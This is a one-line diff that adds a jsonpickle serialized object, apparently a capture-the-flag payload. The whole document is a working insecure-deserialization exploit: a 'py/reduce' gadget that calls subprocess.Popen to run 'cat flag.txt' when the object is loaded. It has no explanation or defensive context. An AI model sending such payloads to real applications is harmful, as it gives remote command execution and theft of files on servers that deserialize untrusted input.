@@ -1,0 +1,1 @@
+{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "flag.txt"]}]}]}
